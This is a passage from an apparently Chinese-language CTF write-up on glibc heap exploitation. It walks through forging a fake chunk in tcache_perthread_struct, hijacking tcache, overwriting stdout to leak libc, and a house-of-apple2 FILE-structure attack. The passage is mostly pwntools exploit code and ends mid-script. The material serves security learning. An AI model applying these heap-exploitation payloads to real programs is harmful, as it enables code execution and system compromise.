+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x10</span> header
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x80</span> data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        block<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0x20</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x10</span> header
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x10</span> data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        unsorted_bin middle<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0x90</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x10</span> header
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x80</span> data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        block<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0x300</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x10</span> header
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x300</span> data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        unsorted_bin end<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0x90</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x10</span> header
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x80</span> data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        block<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0x20</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x10</span> header
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x10</span> data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        total<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0x210</span>
+</span></span></code></pre></div><p>然后我们部署</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>add(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">0x420</span>) # the smaller one
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">0x440</span>) # pass to the end ;; <span style="color:#ff79c6">this</span> is fake header pointer <span style="color:#bd93f9">0x21</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">0x420</span>) # ;; <span style="color:#ff79c6">this</span> is fake header pointer <span style="color:#bd93f9">0x31</span>
+</span></span><span style="display:flex;"><span>dele(<span style="color:#bd93f9">4</span>)
+</span></span><span style="display:flex;"><span>dele(<span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>dele(<span style="color:#bd93f9">2</span>)
+</span></span></code></pre></div><p>然后构造 <code>unsortedbin_start</code> <code>unsortedbin_middle</code> <code>unsortedbin_end</code> 三个堆块，并在中间构造好block防止合并</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add(<span style="color:#bd93f9">5</span>, <span style="color:#bd93f9">0x430</span>) <span style="color:#6272a4"># offset 0x10</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># 开始布置空间</span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">6</span>, <span style="color:#bd93f9">0x80</span>) <span style="color:#6272a4"># unsorted_bin start 0x55555555c290</span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">7</span>, <span style="color:#bd93f9">0x10</span>) <span style="color:#6272a4"># block</span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">8</span>, <span style="color:#bd93f9">0x80</span>) <span style="color:#6272a4"># unsorted_bin middle</span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">9</span>, <span style="color:#bd93f9">0x300</span>) <span style="color:#6272a4"># block</span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">10</span>, <span style="color:#bd93f9">0x80</span>) <span style="color:#6272a4"># unsorted_bin end</span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">11</span>, <span style="color:#bd93f9">0x10</span>) <span style="color:#6272a4"># block</span>
+</span></span></code></pre></div><p>我们首先申请了2号，大小是0x420+0x10的header，在add5的时候，申请了0x430+0x10的堆块，这样错位了0x10，当我们add3 的0x440+0x10的堆块的时候，序号3正好对应了 <code>unsortedbin_start - 0x10</code>的位置，这样就可以在后续拿到伪造 <code>0x31</code>的fakechunk的索引。 另一个可以拿到0x21的fakechunk的索引</p>
+<p>最后添加一个padding来满足 <code>tcache_perthread_struct</code>下面的 <code>0x10001</code> 的fakechunk</p>
+<p>并编辑好他的伪造的size和prev_size位</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>add(<span style="color:#bd93f9">12</span>, <span style="color:#bd93f9">0xe870</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x60</span>)
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">13</span>, <span style="color:#bd93f9">0x20</span>)
+</span></span></code></pre></div><p>
+  <img src="image%202.png" alt="image.png">
+
+</p>
+<p>现在我们通过释放start 和end前对应的fakechunk，来给我们 <code>tcache_perthread_struct</code>中的fakechunk装修一个fd和bk</p>
+<p>
+  <img src="image%203.png" alt="image.png">
+
+</p>
+<p>在释放那两个fakechunk后</p>
+<p>原来的 <code>unsortedbin_start</code>  和 <code>unsortedbin_end</code> 的 <code>size</code> 位会由于tcache而被放入 <code>tcache_key</code></p>
+<p>
+  <img src="image%204.png" alt="image.png">
+
+</p>
+<p>因此我们需要手动修复</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>edit(<span style="color:#bd93f9">3</span>, flat(
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x91</span>
+</span></span><span style="display:flex;"><span>    ), <span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">4</span>, flat(
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x91</span>
+</span></span><span style="display:flex;"><span>    ), <span style="color:#bd93f9">0</span>)
+</span></span></code></pre></div><p>这样我们再看 <code>tcache_perthread_struct</code></p>
+<p>
+  <img src="image%205.png" alt="image.png">
+
+</p>
+<p>发现我们伪造了一个 fd和bk</p>
+<p>fd指向的是 <code>unsortedbin_start</code> bk指向的是 <code>unsortedbin_end</code></p>
+<p>因此下一步的目的就是将start middle  end依次释放，进入到Unsortedbin中，然后将start的bk改成伪造的fakechunk ，将end的fd改成fakechunk（这里弄反了，但是问题不大，能链上就行）</p>
+<p>我们知道，我们的fakechunk的低16位是 <code>b080</code> ，因此可以用部分写来修改，这里需要爆破，有 1/16概率。</p>
+<p>这样我们就成功将 <code>unsortedbin_middle</code> 替换为我们伪造的 <code>fakechunk</code></p>
+<p>
+  <img src="image%206.png" alt="image.png">
+
+</p>
+<p>并且在tcache_perthread_struct下面也有了libc地址。</p>
+<p>然后申请堆块后，就可以控制tcache了</p>
+<p>例如我们申请 <code>add(14, 0xa0)</code> ，就可以控制0x30这条链</p>
+<p>
+  <img src="image%207.png" alt="image.png">
+
+</p>
+<p>他就会将 <code>unsortedbin_start</code> 和 <code>unsortedbin_end</code> 放入 <code>smallbin</code>中，然后从中间的fakechunk切割0xb0大小，于是我们就控制了tcache</p>
+<p>然后改 stdout打iofile_leak</p>
+<p>
+  <img src="image%208.png" alt="image.png">
+
+</p>
+<p>可以使用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>p _IO_2_1_stdout_
+</span></span></code></pre></div><p>查看 stdout</p>
+<p>
+  <img src="image%209.png" alt="image.png">
+
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>edit(<span style="color:#bd93f9">15</span>,flat(
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0xfbad1800</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,b<span style="color:#f1fa8c">&#39;\x00\x90&#39;</span>
+</span></span><span style="display:flex;"><span>    ),<span style="color:#bd93f9">0</span>)
+</span></span></code></pre></div><p>选一个在libc地址空间中的内存，然后leak</p>
+<p>最后就是打iofile组合攻击啦，比如可以用house of apple。</p>
+<p>比如在libc地址上面就有可以写的地址，让我们部署fake_io_file</p>
+<p>
+  <img src="image%2010.png" alt="image.png">
+
+</p>
+<h1 id="最终完整exp">最终完整exp</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>from pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>arch <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;amd64&#34;</span>
+</span></span><span style="display:flex;"><span># log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>remote_ip <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>remote_port <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>libc_path <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;./libc.so.6&#34;</span>
+</span></span><span style="display:flex;"><span>elf_path <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;./pwn&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context.arch  <span style="color:#ff79c6">=</span> arch
+</span></span><span style="display:flex;"><span># context.log_level <span style="color:#ff79c6">=</span> log_level
+</span></span><span style="display:flex;"><span>context.terminal <span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;tmux&#39;</span>,<span style="color:#f1fa8c">&#39;splitw&#39;</span>,<span style="color:#f1fa8c">&#39;-h&#39;</span>]
+</span></span><span style="display:flex;"><span>exe <span style="color:#ff79c6">=</span> ELF(elf_path)
+</span></span><span style="display:flex;"><span>libc <span style="color:#ff79c6">=</span> ELF(libc_path)
+</span></span><span style="display:flex;"><span>context.log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def d()<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    gdb.attach(p)
+</span></span><span style="display:flex;"><span>    pause()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def cmd(i, prompt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;5. exit&#34;</span>)<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    p.sendlineafter(prompt, i)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def add(idx, size)<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    cmd(<span style="color:#f1fa8c">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    p.sendlineafter(<span style="color:#f1fa8c">&#34;idx: &#34;</span>, str(idx))
+</span></span><span style="display:flex;"><span>    p.sendlineafter(<span style="color:#f1fa8c">&#34;size: &#34;</span>, str(size))
+</span></span><span style="display:flex;"><span>    #......
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def edit(idx, payload, offset)<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    cmd(<span style="color:#f1fa8c">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>    p.sendlineafter(<span style="color:#f1fa8c">&#34;idx: &#34;</span>, str(idx))
+</span></span><span style="display:flex;"><span>    p.sendlineafter(<span style="color:#f1fa8c">&#34;offset: &#34;</span>, str(offset))
+</span></span><span style="display:flex;"><span>    p.sendafter(<span style="color:#f1fa8c">&#34;content: &#34;</span>, payload)
+</span></span><span style="display:flex;"><span>    #......
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def show(idx)<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    cmd(<span style="color:#f1fa8c">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>    p.sendlineafter(<span style="color:#f1fa8c">&#34;idx: &#34;</span>, str(idx))
+</span></span><span style="display:flex;"><span>    #......
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def dele(idx)<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    cmd(<span style="color:#f1fa8c">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    p.sendlineafter(<span style="color:#f1fa8c">&#34;idx: &#34;</span>, str(idx))
+</span></span><span style="display:flex;"><span>    #......
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def exit_()<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    cmd(<span style="color:#f1fa8c">&#39;5&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def tcache_safelink(target_addr, tcache_addr)<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> target_addr <span style="color:#ff79c6">^</span> (tcache_addr <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">12</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def csu_gadget(part1, part2, jmp2, arg1 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>, arg2 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>, arg3 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> p64(part1)    # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0</span>)    # rbx be <span style="color:#bd93f9">0x0</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">1</span>)    # rbp be <span style="color:#bd93f9">0x1</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(jmp2)    # r12 jump to
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(arg3)    # r13 <span style="color:#ff79c6">-&gt;</span> rdx    arg3
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(arg2)    # r14 <span style="color:#ff79c6">-&gt;</span> rsi    arg2
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(arg1)    # r15 <span style="color:#ff79c6">-&gt;</span> edi    arg1
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(part2)    # part2 entry will call [r12 <span style="color:#ff79c6">+</span> rbx <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x8</span>]
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">56</span>    # junk <span style="color:#bd93f9">6</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">8</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">56</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def house_of_some_read(read_from, len, _chain)<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    fake_IO_FILE <span style="color:#ff79c6">=</span> IO_FILE_plus_struct()
+</span></span><span style="display:flex;"><span>    fake_IO_FILE.flags <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x8000</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">0x40</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">0x1000</span>
+</span></span><span style="display:flex;"><span>    fake_IO_FILE.fileno <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    fake_IO_FILE._mode <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    fake_IO_FILE._IO_write_base <span style="color:#ff79c6">=</span> read_from
+</span></span><span style="display:flex;"><span>    fake_IO_FILE._IO_write_ptr <span style="color:#ff79c6">=</span> read_from<span style="color:#ff79c6">+</span>len
+</span></span><span style="display:flex;"><span>    fake_IO_FILE.chain <span style="color:#ff79c6">=</span> _chain
+</span></span><span style="display:flex;"><span>    fake_IO_FILE.vtable <span style="color:#ff79c6">=</span> libc.sym[<span style="color:#f1fa8c">&#39;_IO_file_jumps&#39;</span>] <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x8</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> bytes(fake_IO_FILE)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def house_of_some_write(write_from, len, _chain)<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    fake_IO_FILE <span style="color:#ff79c6">=</span> IO_FILE_plus_struct()
+</span></span><span style="display:flex;"><span>    fake_IO_FILE.flags <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x8000</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">0x800</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">0x1000</span>
+</span></span><span style="display:flex;"><span>    fake_IO_FILE.fileno <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>    fake_IO_FILE._mode <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    fake_IO_FILE._IO_write_base <span style="color:#ff79c6">=</span> write_from
+</span></span><span style="display:flex;"><span>    fake_IO_FILE._IO_write_ptr <span style="color:#ff79c6">=</span> write_from <span style="color:#ff79c6">+</span> len
+</span></span><span style="display:flex;"><span>    fake_IO_FILE.chain <span style="color:#ff79c6">=</span> _chain
+</span></span><span style="display:flex;"><span>    fake_IO_FILE.vtable <span style="color:#ff79c6">=</span> libc.sym[<span style="color:#f1fa8c">&#39;_IO_file_jumps&#39;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> bytes(fake_IO_FILE)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def house_of_apple2_all_in_one(_IO_wfile_jumps, addr, RIP)<span style="color:#ff79c6">:</span> # 算好偏移直接all <span style="color:#ff79c6">in</span> one 总长度0x240
+</span></span><span style="display:flex;"><span>    # <span style="color:#bd93f9">0xd8</span>一个_IO_FILE <span style="color:#bd93f9">0xe0</span>一个wide_data
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    调用流为_IO_wfile_overflow-&gt;_IO_wdoallocbuf-&gt;_IO_WDOALLOCATE-&gt;Your RIP
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    _flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为  sh;，注意前面有两个空格
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> b<span style="color:#f1fa8c">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    # wide_data
+</span></span><span style="display:flex;"><span>    wide_data_entry <span style="color:#ff79c6">=</span> addr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xe0</span> # <span style="color:#bd93f9">0x8</span> block to before
+</span></span><span style="display:flex;"><span>    wide_data_vtable_entry <span style="color:#ff79c6">=</span> addr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xe0</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xe0</span> # offset <span style="color:#ff79c6">of</span> wide_data_vtable
+</span></span><span style="display:flex;"><span>    # main
+</span></span><span style="display:flex;"><span>    from pwncli <span style="color:#ff79c6">import</span> IO_FILE_plus_struct
+</span></span><span style="display:flex;"><span>    fake_IO_FILE <span style="color:#ff79c6">=</span> IO_FILE_plus_struct()
+</span></span><span style="display:flex;"><span>    fake_IO_FILE.flags <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x68732020</span>
+</span></span><span style="display:flex;"><span>    fake_IO_FILE._mode <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    fake_IO_FILE._IO_write_ptr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>    fake_IO_FILE._IO_write_base <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    fake_IO_FILE.vtable <span style="color:#ff79c6">=</span> _IO_wfile_jumps
+</span></span><span style="display:flex;"><span>    fake_IO_FILE._wide_data <span style="color:#ff79c6">=</span> wide_data_entry
+</span></span><span style="display:flex;"><span>    fake_IO_FILE._lock <span style="color:#ff79c6">=</span> wide_data_entry
+</span></span><span style="display:flex;"><span>    fake_IO_FILE <span style="color:#ff79c6">=</span> bytes(fake_IO_FILE)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> fake_IO_FILE
+</span></span><span style="display:flex;"><span>    # wide_data 这里只要控制vtable即可
+</span></span><span style="display:flex;"><span>    pad <span style="color:#ff79c6">=</span> flat([
+</span></span><span style="display:flex;"><span>        b<span style="color:#f1fa8c">&#39;\x00&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0xe0</span>,
+</span></span><span style="display:flex;"><span>        wide_data_vtable_entry
+</span></span><span style="display:flex;"><span>    ])
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> pad
+</span></span><span style="display:flex;"><span>    # wide_data_vtable
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;&#34;&#34;_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足(B + 0x68) = C&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">+=</span> p64(RIP)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x10</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def pwn()<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x3d8</span>)
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">0x3e8</span>)
+</span></span><span style="display:flex;"><span>    dele(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    dele(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> range(<span style="color:#bd93f9">7</span>)<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        add(<span style="color:#bd93f9">0x1f</span><span style="color:#ff79c6">-</span>i, <span style="color:#bd93f9">0x88</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        这里需要overlap能够修改heap header
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        比较简单的一种思路就是申请一个大的 后续错位0x10就行(block_chunk不要) 要注意所有堆块都要能被top_chunk回收
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        算算数：
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        unsorted_bin start: 0x90
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        0x10 header
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        0x80 data
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        block: 0x20
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        0x10 header
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        0x10 data
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        unsorted_bin middle: 0x90
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        0x10 header
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        0x80 data
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        block: 0x300
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        0x10 header
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        0x300 data
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        unsorted_bin end: 0x90
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        0x10 header
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        0x80 data
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        block: 0x20
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        0x10 header
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        0x10 data
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        total: 0x210
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">0x420</span>) # the smaller one
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">0x440</span>) # pass to the end ;; <span style="color:#ff79c6">this</span> is fake header pointer <span style="color:#bd93f9">0x21</span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">0x420</span>) # ;; <span style="color:#ff79c6">this</span> is fake header pointer <span style="color:#bd93f9">0x31</span>
+</span></span><span style="display:flex;"><span>    dele(<span style="color:#bd93f9">4</span>)
+</span></span><span style="display:flex;"><span>    dele(<span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>    dele(<span style="color:#bd93f9">2</span>)
+</span></span><span style="display:flex;"><span>    # 开始错位0x10
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">5</span>, <span style="color:#bd93f9">0x430</span>) # offset <span style="color:#bd93f9">0x10</span>
+</span></span><span style="display:flex;"><span>    # 开始布置空间
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">6</span>, <span style="color:#bd93f9">0x80</span>) # unsorted_bin start <span style="color:#bd93f9">0x55555555c290</span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">7</span>, <span style="color:#bd93f9">0x10</span>) # block
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">8</span>, <span style="color:#bd93f9">0x80</span>) # unsorted_bin middle
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">9</span>, <span style="color:#bd93f9">0x300</span>) # block
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">10</span>, <span style="color:#bd93f9">0x80</span>) # unsorted_bin end
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">11</span>, <span style="color:#bd93f9">0x10</span>) # block
+</span></span><span style="display:flex;"><span>    # offset <span style="color:#bd93f9">0x10000</span> to add a block
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">12</span>, <span style="color:#bd93f9">0xe870</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x60</span>)
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">13</span>, <span style="color:#bd93f9">0x20</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">13</span>, flat(
